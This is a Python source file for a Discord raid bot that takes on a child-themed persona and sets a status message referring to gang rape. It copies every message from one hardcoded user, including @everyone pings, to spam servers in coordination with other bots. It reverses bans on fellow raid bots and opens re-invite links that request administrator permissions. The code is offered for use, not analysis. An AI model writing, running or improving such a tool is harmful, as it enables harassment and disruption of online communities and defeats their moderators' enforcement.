import discord
import random
import os
from six.moves import configparser
import webbrowser

auditMsg = ''
avatars = [ 'child0.png', 'child1.png' ]

bot = discord.Client()
bot.raid = False
bot.counter = 0

@bot.event
async def on_ready():
    print('API connected!')

    print('Setting icon and name...')
    file = open(random.choice(avatars), 'rb')
    try:
        await bot.user.edit(username='Squidward Child', avatar=file.read())
    except:
        pass

    print('Setting status message...')
    await bot.change_presence(game=discord.Game(name='server gang-rape'))

    print('Ready to spam!')

@bot.event
async def on_message(message):
    if message.author.id == 466016028812509186:
        if not bot.raid:
            print('=== Spam has bugun ===')
            bot.raid = not bot.raid
        if message.mention_everyone:
            bot.counter += 1
            if bot.counter % 100:
                print('All the bots total have spammed @everyone ' + bot.counter + ' times!')
        await message.channel.send(message.content)

@bot.event
async def on_member_ban(banGuild, user):
    if bot.raid:
        try:
            await banGuild.unban(user, reason=auditMsg)
        except:
            pass
        if user.bot:
            print('A bot was banned! I have unbanned it. Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(user.id) + '&permissions=0&scope=bot')
            webbrowser.open('https://discordapp.com/api/oauth2/authorize?client_id=' + str(user.id) + '&permissions=8&scope=bot', new=0, autoraise=True)

@bot.event
async def on_member_remove(member):
    if bot.raid:
        if member.bot:
            print('A bot was kicked! Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(member.id) + '&permissions=0&scope=bot')
            webbrowser.open('https://discordapp.com/api/oauth2/authorize?client_id=' + str(member.id) + '&permissions=8&scope=bot', new=0, autoraise=True)

filename = "childbot.cfg"
if os.path.isfile(filename):
    config = configparser.ConfigParser()
    config.read(filename)
    token = config.get("config", "token")
else:
    print('NO CONFIG FOUND')
    exit(1)

bot.run(token)
